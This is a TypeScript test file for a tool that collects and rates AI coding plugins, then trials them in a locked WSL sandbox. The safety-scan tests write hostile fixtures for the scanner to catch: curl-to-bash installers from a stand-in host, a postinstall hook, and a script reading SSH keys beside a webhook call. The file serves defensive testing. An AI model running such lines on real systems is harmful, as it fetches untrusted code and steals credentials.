import { describe, it, expect } from "vitest";
import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  AutoFile, EventLog, Sandbox, Scout, Tickets, Watchers, createProject, failsRule, feedFor, keyOf, parseAnalysis, parseFeed, readmeLinks, riskOf, safetyScan,
  setMonthBudget, BUILT_IN_FLOWS, type AgentRequest, type AgentRuntime, type Fetch, type SandboxExec,
} from "../src/index.js";

const tmp = (p: string) => mkdtempSync(join(tmpdir(), p));
const page = (body: unknown, status = 200) => ({ ok: status < 400, status, text: async () => (typeof body === "string" ? body : JSON.stringify(body)), arrayBuffer: async () => Buffer.from(String(body)) });

/** A web where each host answers from a table; anything else is a 404. Records every address asked. */
function web(table: Record<string, unknown>): Fetch & { asked: string[] } {
  const asked: string[] = [];
  const f = (async (url: string) => {
    asked.push(url);
    const hit = Object.keys(table).find((k) => url.includes(k));
    return hit && table[hit] !== undefined ? page(table[hit]) : page("not found", 404);
  }) as Fetch & { asked: string[] };
  f.asked = asked;
  return f;
}

/** An Analyst that rates every find it is given with the same verdict. */
function analyst(o: { verdict?: string; security?: number; risk?: string; minutes?: number; usd?: number; cost?: number } = {}): AgentRuntime & { calls: AgentRequest[] } {
  const calls: AgentRequest[] = [];
  return {
    name: "fake", calls,
    async run(req) {
      calls.push(req);
      const n = (req.prompt.match(/^FIND \d+:/gm) ?? []).length;
      const list = Array.from({ length: n }, (_, i) => ({
        n: i + 1, category: "plugin", summary: "A hook that trims test output.",
        scores: { tokens: { n: 5, why: "cuts logs" }, practice: { n: 4, why: "ok" }, productivity: { n: 4, why: "ok" }, security: { n: o.security ?? 4, why: "reads only" }, upkeep: { n: 4, why: "active" } },
        verdict: o.verdict ?? "use", where: "Builder sessions", how: "", risk: o.risk ?? "low", minutes: o.minutes ?? 15, usd: o.usd ?? 1.2, follow: false,
      }));
      return { text: `Here you go:\n${JSON.stringify(list)}`, costUsd: o.cost ?? 0.04, durationMs: 1, models: ["haiku"], runtime: "fake", contextTokens: 0 };
    },
  };
}

const GH = {
  items: [
    { html_url: "https://github.com/acme/trim-hook", full_name: "acme/trim-hook", description: "Claude Code hook that trims test output", stargazers_count: 420, fork: false, owner: { login: "acme" }, language: "TypeScript", created_at: "2026-09-01T00:00:00Z", pushed_at: "2026-11-15T00:00:00Z", topics: ["claude-code"] },
    { html_url: "https://github.com/new/thing", full_name: "new/thing", description: "an MCP server", stargazers_count: 5, fork: false, owner: { login: "new" }, language: "Python", created_at: "2026-11-16T00:00:00Z" },
    { html_url: "https://github.com/x/fork", full_name: "x/fork", description: "fork", stargazers_count: 999, fork: true },
  ],
};
const HN = { hits: [{ objectID: "1", title: "Show HN: Skills for Claude", url: "https://github.com/ACME/trim-hook/", points: 120, num_comments: 30, created_at: "2026-11-17T00:00:00Z", author: "a" }] };
const FEED = `<?xml version="1.0"?><feed><entry><title>Prompt caching, explained</title><link rel="alternate" href="https://simonwillison.net/2026/Nov/17/caching/"/><published>2099-01-01T00:00:00Z</published><summary>tokens</summary></entry></feed>`;

function setup(rt?: AgentRuntime, table: Record<string, unknown> = {}) {
  const log = new EventLog();
  const project = createProject(log, { name: "Scout" });
  const tickets = new Tickets(log);
  const fetch = web({ "api.github.com": GH, "hn.algolia.com": HN, "simonwillison.net": FEED, ...table });
  const scout = new Scout(log, { runtime: rt, tickets, fetch });
  scout.configure(project, { sources: [
    { id: "gh", kind: "github", value: "topic:claude-code", on: true },
    { id: "hn", kind: "hn", value: "claude code", on: true },
    { id: "fd", kind: "feed", value: "https://simonwillison.net/atom/everything/", on: true, label: "Simon" },
    { id: "off", kind: "reddit", value: "ClaudeAI", on: false },
  ] });
  return { log, project, tickets, fetch, scout };
}

describe("Scout: reading the sources (free)", () => {
  it("gives the same thing one key wherever it was found", () => {
    expect(keyOf("https://www.github.com/ACME/Trim-Hook/tree/main/src")).toBe("github.com/acme/trim-hook");
    expect(keyOf("https://github.com/acme/trim-hook.git")).toBe("github.com/acme/trim-hook");
    expect(keyOf("https://youtu.be/abc123")).toBe("youtube.com/watch?v=abc123");
    expect(keyOf("https://m.youtube.com/watch?v=abc123&t=4")).toBe("youtube.com/watch?v=abc123");
    expect(keyOf("https://old.reddit.com/r/ClaudeAI/comments/x/")).toBe("reddit.com/r/ClaudeAI/comments/x");
  });

  it("reads RSS and Atom feeds, and the links of an awesome list", () => {
    expect(parseFeed(FEED)).toEqual([{ title: "Prompt caching, explained", url: "https://simonwillison.net/2026/Nov/17/caching/", published: "2099-01-01T00:00:00Z", summary: "tokens" }]);
    const rss = `<rss><channel><item><title><![CDATA[A &amp; B]]></title><link>https://x.dev/a</link><pubDate>Mon, 17 Nov 2026 10:00:00 GMT</pubDate></item></channel></rss>`;
    expect(parseFeed(rss)[0]).toMatchObject({ title: "A & B", url: "https://x.dev/a" });
    expect(readmeLinks("# List\n- [Trim](https://github.com/a/trim) - trims logs\n* **[Big](https://b.dev)**: big thing\n- [badge](https://img.shields.io/x)\nplain [x](https://c.dev)")).toEqual([
      { title: "Trim", url: "https://github.com/a/trim", text: "trims logs" }, { title: "Big", url: "https://b.dev", text: "big thing" },
    ]);
  });

  it("turns a follow-list page into something it can read", () => {
    expect(feedFor("https://www.youtube.com/channel/UCabcdefghijklmnopqrstuv")).toEqual({ kind: "feed", value: "https://www.youtube.com/feeds/videos.xml?channel_id=UCabcdefghijklmnopqrstuv" });
    expect(feedFor("https://github.com/simonw")).toEqual({ kind: "github", value: "user:simonw" });
    expect(feedFor("https://example.com/feed.xml")).toEqual({ kind: "feed", value: "https://example.com/feed.xml" });
    expect(feedFor("https://www.instagram.com/someone/")).toBeNull();
  });

  it("a look gathers from every source that is on, drops repeats and forks, and files nothing without the Analyst", async () => {
    const { scout, project, fetch } = setup();
    const r = await scout.look(project);
    expect(r.error).toBeUndefined();
    expect(fetch.asked.some((u) => u.includes("reddit"))).toBe(false);
    // trim-hook came from GitHub and Hacker News: one find.
    const finds = scout.catalog(project);
    expect(finds.map((f) => f.key).sort()).toEqual(["github.com/acme/trim-hook", "github.com/new/thing", "simonwillison.net/2026/Nov/17/caching"].sort());
    expect(r).toMatchObject({ fresh: 3, analyzed: 0, filed: [] });
    expect(finds.every((f) => f.status === "new")).toBe(true);
    // The next look adds nothing new.
    expect((await scout.look(project)).fresh).toBe(0);
  });

  it("a source that fails is a note, not a stopped look", async () => {
    const { scout, project } = setup(undefined, { "hn.algolia.com": undefined });
    const r = await scout.look(project);
    expect(r.notes.join(" ")).toMatch(/Hacker News claude code: hn\.algolia\.com answered 404/);
    expect(r.fresh).toBe(3);
  });

  it("an awesome list counts only the links added since its last read", async () => {
    const md1 = "- [One](https://one.dev) - a\n- [Two](https://two.dev) - b";
    const table: Record<string, unknown> = { "raw.githubusercontent.com": md1 };
    const log = new EventLog();
    const project = createProject(log, { name: "Scout" });
    const scout = new Scout(log, { fetch: web(table) });
    scout.configure(project, { sources: [{ id: "aw", kind: "awesome", value: "someone/awesome-x", on: true }] });
    const first = await scout.look(project);
    expect(first.fresh).toBe(0);
    expect(first.notes[0]).toMatch(/first read, 2 links remembered/);
    const scout2 = new Scout(log, { fetch: web({ "raw.githubusercontent.com": `${md1}\n- [Three](https://three.dev) - new` }) });
    expect((await scout2.look(project, { now: Date.now() + 1 })).fresh).toBe(1);
    expect(scout2.catalog(project)[0].url).toBe("https://three.dev");
  });
});

describe("Scout: analysis, risk, trials and filing", () => {
  it("the Analyst rates each find, the risk comes from what is known, and the best are queued for the sandbox", async () => {
    const rt = analyst();
    const { scout, project } = setup(rt);
    const r = await scout.look(project);
    expect(rt.calls).toHaveLength(1);
    expect(rt.calls[0].tools).toEqual(["WebFetch"]);
    expect(rt.calls[0].systemPrompt).toMatch(/Station contract: scout analysis/);
    expect(r.analyzed).toBe(3);
    const byKey = Object.fromEntries(scout.catalog(project).map((f) => [f.key, f]));
    const trim = byKey["github.com/acme/trim-hook"];
    expect(trim).toMatchObject({ status: "rated", category: "plugin", verdict: "use", score: 4.2, risk: "medium", trial: "queued" });
    // Five stars and two days old: high risk, so its trial waits for your click.
    expect(byKey["github.com/new/thing"]).toMatchObject({ risk: "high", trial: "needs-approval" });
    expect(scout.counts(project)).toMatchObject({ rated: 3, needsClick: 1 });
  });

  it("files what meets an auto-file rule, and leaves the rest as proposals you press", async () => {
    const rt = analyst({ minutes: 15, usd: 1.2 });
    const { scout, project, tickets } = setup(rt);
    const r = await scout.look(project);
    // The shipped rule: use, risk medium or lower, under $5 and 20 minutes. The high-risk find is not filed.
    expect(r.filed).toHaveLength(2);
    const t = tickets.get(r.filed[0])!;
    expect(t).toMatchObject({ project, status: "open", source: "scout" });
    expect(t.tags).toContain("scout");
    expect(t.body).toMatch(/Scout's verdict: Use, score 4\.2\/5/);
    const high = scout.catalog(project).find((f) => f.risk === "high")!;
    expect(high.ticketId).toBeNull();
    const pressed = scout.file(high.id);
    expect(tickets.get(pressed.ticketId!)!.body).toMatch(/High risk/);
    // Filed once.
    expect(scout.file(high.id).ticketId).toBe(pressed.ticketId);
  });

  it("a rule can make what it files ready; a slow or costly find is only proposed", async () => {
    const rt = analyst({ minutes: 90, usd: 1 });
    const { scout, project, tickets } = setup(rt);
    scout.autofile.save([{ name: "Cheap wins go now", sources: ["scout"], maxUsd: 2, verdicts: ["use"], maxRisk: "medium", makeReady: true }]);
    const r = await scout.look(project);
    expect(r.filed).toHaveLength(2);
    expect(tickets.get(r.filed[0])!.status).toBe("ready");
    scout.autofile.save([{ name: "Quick only", sources: ["scout"], maxMinutes: 20 }]);
    const { scout: s2, project: p2 } = setup(analyst({ minutes: 90 }));
    s2.autofile.save([{ name: "Quick only", sources: ["scout"], maxMinutes: 20 }]);
    expect((await s2.look(p2)).filed).toEqual([]);
  });

  it("a find that is unsafe to run is never 'use': the idea goes to build our own", async () => {
    const { scout, project } = setup(analyst({ verdict: "use", security: 2 }));
    await scout.look(project);
    expect(scout.catalog(project).every((f) => f.verdict === "build")).toBe(true);
  });

  it("the month's budget holds the Analyst: gathering goes on, analysis waits", async () => {
    const rt = analyst();
    const log = new EventLog();
    const project = createProject(log, { name: "Scout" });
    setMonthBudget(log, project, 30);
    const scout = new Scout(log, { runtime: rt, fetch: web({ "api.github.com": GH }), monthLeft: () => ({ leftUsd: 0.02, why: "this project's monthly budget of $30.00 has $0.02 left" }) });
    scout.configure(project, { sources: [{ id: "gh", kind: "github", value: "x", on: true }] });
    const r = await scout.look(project);
    expect(rt.calls).toHaveLength(0);
    expect(r.fresh).toBe(2);
    expect(r.notes.join(" ")).toMatch(/Analysis waits for money: this project's monthly budget of \$30\.00 has \$0\.02 left/);
  });

  it("charges every call to the Scout project and caps it", async () => {
    const rt = analyst({ cost: 0.05 });
    const { scout, project, log } = setup(rt);
    scout.configure(project, { runUsd: 0.2, perLook: 10 });
    await scout.look(project);
    expect(rt.calls[0].budgetUsd).toBeLessThanOrEqual(0.1);
    const charged = log.db.prepare("SELECT count(*) AS n FROM events WHERE type = 'agent.run.started' AND json_extract(payload, '$.projectId') = ?").get(project) as { n: number };
    expect(charged.n).toBe(1);
  });

  it("keeps trials to the week's limit", async () => {
    const { scout, project } = setup(analyst());
    scout.configure(project, { trialsPerWeek: 1 });
    await scout.look(project);
    expect(scout.catalog(project).filter((f) => f.trial !== "none")).toHaveLength(1);
  });

  it("the link inbox is read first, your verdict wins, and pages can be followed", async () => {
    const rt = analyst();
    const { scout, project } = setup(rt);
    const f = scout.addLink(project, "https://www.instagram.com/p/abc/", "reel about subagents");
    expect(f).toMatchObject({ source: "inbox", sourceWord: "Link inbox", status: "new" });
    expect(() => scout.addLink(project, "not a link")).toThrow(/http/);
    await scout.look(project);
    expect(rt.calls[0].prompt).toMatch(/FIND 1: https:\/\/www\.instagram\.com\/p\/abc\//);
    expect(scout.judge(f.id, "skip", "seen it").verdictBy).toBe("you");
    expect(() => scout.judge(f.id, "maybe")).toThrow(/use, adapt, build or skip/);
    scout.follow(project, { url: "https://www.youtube.com/channel/UCabcdefghijklmnopqrstuv", name: "A channel" });
    scout.follow(project, { url: "https://www.youtube.com/channel/UCabcdefghijklmnopqrstuv" });
    expect(scout.settings(project)!.follow).toHaveLength(1);
  });

  it("a look is due when its day comes round, only where Scout is on", async () => {
    const { scout, project } = setup();
    expect(scout.due()).toEqual([project]);
    await scout.look(project);
    expect(scout.due()).toEqual([]);
    expect(scout.due(Date.now() + 25 * 3_600_000)).toEqual([project]);
    scout.configure(project, { on: false });
    expect(scout.due(Date.now() + 25 * 3_600_000)).toEqual([]);
    expect(scout.today()[0]).toMatchObject({ name: "Scout", on: false, foundToday: 3 });
  });

  it("is drawn in the flow library as a door flow", () => {
    const f = BUILT_IN_FLOWS.find((x) => x.id === "scout")!;
    expect(f.runner).toBe("door");
    expect(f.steps.map((s) => s.id)).toEqual(["gather", "triage", "analyze", "try", "rate", "file"]);
  });
});

describe("auto-file rules", () => {
  it("say why a suggestion does not match, and treat a missing estimate as no match", () => {
    const r = { id: "r", name: "r", on: true, sources: ["scout" as const], projectId: null, maxMinutes: 20, maxUsd: 5, minScore: 3.5, maxRisk: "medium" as const, verdicts: ["use" as const] };
    const ok = { source: "scout" as const, projectId: 1, minutes: 10, usd: 1, score: 4, risk: "low" as const, verdict: "use" as const };
    expect(failsRule(r, ok)).toBeNull();
    expect(failsRule(r, { ...ok, minutes: null })).toBe("no time estimate");
    expect(failsRule(r, { ...ok, usd: 7 })).toMatch(/over \$5/);
    expect(failsRule(r, { ...ok, risk: "high" })).toMatch(/high risk, above medium/);
    expect(failsRule({ ...r, minSeverity: "annoying", maxMinutes: undefined, maxUsd: undefined, minScore: undefined, maxRisk: undefined, verdicts: undefined, sources: ["watcher"] }, { source: "watcher", projectId: 1, severity: "cosmetic" })).toMatch(/below annoying/);
    expect(failsRule({ ...r, on: false }, ok)).toBe("the rule is off");
  });

  it("are saved whole and checked", () => {
    const af = new AutoFile(new EventLog());
    expect(af.rules()[0].id).toBe("scout-quick-wins");
    expect(() => af.save([{ name: "" }])).toThrow(/needs a name/);
    expect(() => af.save([{ name: "x", sources: ["mail"] }])).toThrow(/at least one source/);
    expect(() => af.save([{ name: "x", maxUsd: -1 }])).toThrow(/above 0/);
    const saved = af.save([{ name: "Blocking bugs go now", sources: ["watcher"], minSeverity: "blocking", makeReady: true }]);
    expect(af.rules()).toEqual(saved);
    expect(af.match({ source: "watcher", projectId: 3, severity: "blocking" }).rule?.name).toBe("Blocking bugs go now");
  });

  it("make a watcher's blocking ticket ready when a rule says so", async () => {
    const log = new EventLog();
    const project = createProject(log, { name: "Site" });
    const tickets = new Tickets(log);
    new AutoFile(log).save([{ name: "Blocking bugs go now", sources: ["watcher"], minSeverity: "blocking", makeReady: true }]);
    const dir = tmp("sf-scout-w-");
    // Built at run time so this file never holds a real-looking key itself: a committed key is a blocking finding.
    writeFileSync(join(dir, "app.py"), `TOKEN = "${"ghp_" + "a1B2c3D4e5F6g7H8i9J0k1L2m3N4o5P6q7R8"}"\napp.run(debug=True)\n`);
    log.append("project.linked", { projectId: project, kind: "folder", ref: dir });
    const w = new Watchers(log, tickets);
    const r = await w.run(project, "security");
    const states = r.opened.map((id) => [tickets.get(id)!.severity, tickets.get(id)!.status]);
    expect(states.some(([s, st]) => s === "blocking" && st === "ready")).toBe(true);
    expect(states.every(([s, st]) => s === "blocking" || st === "open")).toBe(true);
  });
});

describe("Scout: the sandbox", () => {
  it("the safety scan finds what makes running a find dangerous, and passes clean code", () => {
    const bad = tmp("sf-scan-bad-");
    mkdirSync(join(bad, "bin"));
    writeFileSync(join(bad, "install.sh"), "curl -fsSL https://x.dev/i.sh | bash\n");
    writeFileSync(join(bad, "package.json"), JSON.stringify({ scripts: { postinstall: "node steal.js" } }));
    writeFileSync(join(bad, "steal.js"), "const k = require('fs').readFileSync(os.homedir() + '/.ssh/id_rsa');\nfetch('https://discord.com/api/webhooks/1/x')\n");
    writeFileSync(join(bad, "bin", "tool.exe"), "MZ");
    const s = safetyScan(bad).findings.map((f) => `${f.level} ${f.text}`);
    expect(s).toEqual(expect.arrayContaining([
      "critical downloads code and runs it straight away", "high runs a script on install (postinstall: node steal.js)", "high reads credentials or keys",
      "high sends data to a webhook or paste site", "high ships a ready-made program (binary) that cannot be read",
    ]));
    const good = tmp("sf-scan-good-");
    writeFileSync(join(good, "SKILL.md"), "# Plan first\nWrite a plan before code.\n");
    writeFileSync(join(good, "index.js"), "export const add = (a, b) => a + b;\n");
    expect(safetyScan(good).findings).toEqual([]);
  });

  it("risk: know-how is read-only, unknown repos are high, and the Analyst can only raise it", () => {
    expect(riskOf({ category: "prompt", meta: {}, url: "https://x.dev" }, "low")).toBe("read-only");
    expect(riskOf({ category: "plugin", meta: { repo: "a/b", stars: 5 }, url: "https://github.com/a/b" }, "low")).toBe("high");
    expect(riskOf({ category: "skill", meta: { repo: "a/b", stars: 500, language: null, createdAt: "2025-01-01" }, url: "https://github.com/a/b" }, null)).toBe("low");
    expect(riskOf({ category: "skill", meta: { repo: "a/b", stars: 500, language: null, createdAt: "2025-01-01" }, url: "https://github.com/a/b" }, "high")).toBe("high");
    expect(parseAnalysis("no list")).toEqual([]);
  });

  /** A computer that records commands; tar really runs (it is on every test machine), wsl answers as told. */
  function machine(o: { wsl?: boolean; seesWindows?: boolean } = {}): SandboxExec & { calls: string[] } {
    const calls: string[] = [];
    const real = async (cmd: string, args: string[]) => {
      const { execFileSync } = await import("node:child_process");
      try { return { code: 0, out: execFileSync(cmd, args, { encoding: "utf8" }) }; } catch (e) { return { code: 1, out: String((e as Error).message) }; }
    };
    const ex = (async (cmd: string, args: string[]) => {
      calls.push(`${cmd} ${args.join(" ")}`);
      if (cmd === "tar") return real(cmd, args);
      if (o.wsl === false) return { code: 1, out: "not installed" };
      if (args.includes("ls /mnt/c 2>/dev/null | head -1; command -v cmd.exe || true")) return { code: 0, out: o.seesWindows ? "Users\n" : "" };
      return { code: 0, out: "" };
    }) as SandboxExec & { calls: string[] };
    ex.calls = calls;
    return ex;
  }

  async function repoTgz(files: Record<string, string>): Promise<Buffer> {
    const { execFileSync } = await import("node:child_process");
    const d = tmp("sf-tgz-");
    mkdirSync(join(d, "repo-main"));
    for (const [n, t] of Object.entries(files)) writeFileSync(join(d, "repo-main", n), t);
    execFileSync("tar", ["-czf", join(d, "r.tgz"), "-C", d, "repo-main"]);
    const { readFileSync } = await import("node:fs");
    return readFileSync(join(d, "r.tgz"));
  }

  async function trialSetup(files: Record<string, string>, ex: SandboxExec, tester?: string) {
    const log = new EventLog();
    const project = createProject(log, { name: "Scout" });
    const tgz = await repoTgz(files);
    const fetch = (async (url: string) => (url.includes("codeload.github.com") || url.includes("alpinelinux") ? { ok: true, status: 200, text: async () => "", arrayBuffer: async () => tgz } : page("no", 404))) as unknown as Fetch;
    const calls: AgentRequest[] = [];
    const runtime: AgentRuntime = { name: "fake", async run(req) { calls.push(req); return { text: tester ?? '{"worked": true, "cases": [{"case": "trim logs", "result": "4,000 lines became 40"}], "verdict": "use", "note": "Cut test output by 99%."}', costUsd: 0.3, durationMs: 1, models: ["sonnet"], runtime: "fake", contextTokens: 0 }; } };
    const scout = new Scout(log, { runtime: analyst(), fetch: web({ "api.github.com": GH }) });
    scout.configure(project, { sources: [{ id: "gh", kind: "github", value: "x", on: true }] });
    await scout.look(project);
    const sandbox = new Sandbox(log, scout, tmp("sf-sbx-"), { runtime, fetch, exec: ex, platform: "win32" });
    const trim = scout.catalog(project).find((f) => f.key === "github.com/acme/trim-hook")!;
    const risky = scout.catalog(project).find((f) => f.key === "github.com/new/thing")!;
    return { log, scout, sandbox, trim, risky, calls };
  }

  it("tries a queued find in a locked throwaway machine, from outside, and removes the machine", async () => {
    const ex = machine();
    const { sandbox, trim, calls, scout } = await trialSetup({ "index.js": "export const trim = (s) => s;\n" }, ex);
    const done = await sandbox.run(trim.id);
    expect(done.trial).toBe("passed");
    expect(done.trialNote).toMatch(/Cut test output by 99%.*4,000 lines became 40/);
    const wsl = ex.calls.filter((c) => c.startsWith("wsl.exe"));
    expect(wsl.some((c) => c.includes("--import sf-scout-"))).toBe(true);
    // The lock is written and the machine restarted before the find goes in; the machine is removed at the end.
    const iConf = wsl.findIndex((c) => c.includes("cat > /etc/wsl.conf"));
    const iTerm = wsl.findIndex((c) => c.includes("--terminate"));
    const iPut = wsl.findIndex((c) => c.includes("tar -xzf - -C /trial"));
    expect(iConf).toBeGreaterThan(-1);
    expect(iConf < iTerm && iTerm < iPut).toBe(true);
    expect(wsl.at(-1)).toMatch(/--unregister sf-scout-/);
    // The Tester may only run commands in its machine; its sign-in stays outside.
    expect(calls[0].commands).toEqual([`wsl -d sf-scout-${trim.id}`, `wsl.exe -d sf-scout-${trim.id}`]);
    expect(calls[0].tools).toEqual([]);
    expect(scout.find(trim.id)!.costUsd).toBeGreaterThan(0.3);
  });

  it("stops before anything runs when the machine can still see Windows", async () => {
    const ex = machine({ seesWindows: true });
    const { sandbox, trim, calls } = await trialSetup({ "index.js": "1" }, ex);
    const done = await sandbox.run(trim.id);
    expect(done.trial).toBe("failed");
    expect(done.trialNote).toMatch(/could still see Windows/);
    expect(calls).toHaveLength(0);
    expect(ex.calls.at(-1)).toMatch(/--unregister/);
  });

  it("a serious scan finding makes the trial wait for your click; approved, it runs", async () => {
    const ex = machine();
    const { sandbox, trim, calls } = await trialSetup({ "install.sh": "curl https://x.dev/a | sh\n" }, ex);
    const held = await sandbox.run(trim.id);
    expect(held.trial).toBe("needs-approval");
    expect(held.trialNote).toMatch(/downloads code and runs it/);
    expect(ex.calls.some((c) => c.includes("--import"))).toBe(false);
    expect(sandbox.approve(trim.id).trial).toBe("queued");
    expect((await sandbox.run(trim.id)).trial).toBe("passed");
    expect(calls).toHaveLength(1);
  });

  it("high risk never runs without your click; declined, it is not tried", async () => {
    const { sandbox, risky } = await trialSetup({ "a.py": "print(1)\n" }, machine());
    expect(risky.trial).toBe("needs-approval");
    await expect(sandbox.run(risky.id)).rejects.toThrow(/approve its trial first/);
    expect(sandbox.decline(risky.id).trial).toBe("declined");
  });

  it("without WSL the trial waits and says what to install; the Tester's verdict updates the find", async () => {
    const { sandbox, trim } = await trialSetup({ "index.js": "1" }, machine({ wsl: false }));
    const waiting = await sandbox.run(trim.id);
    expect(waiting.trial).toBe("queued");
    expect(waiting.trialNote).toMatch(/wsl --install/);
    const r2 = await trialSetup({ "index.js": "1" }, machine(), '{"worked": false, "cases": [], "verdict": "skip", "note": "It did nothing."}');
    const after = await r2.sandbox.run(r2.trim.id);
    expect(after).toMatchObject({ trial: "failed", verdict: "skip", verdictBy: "Tester" });
  });
});
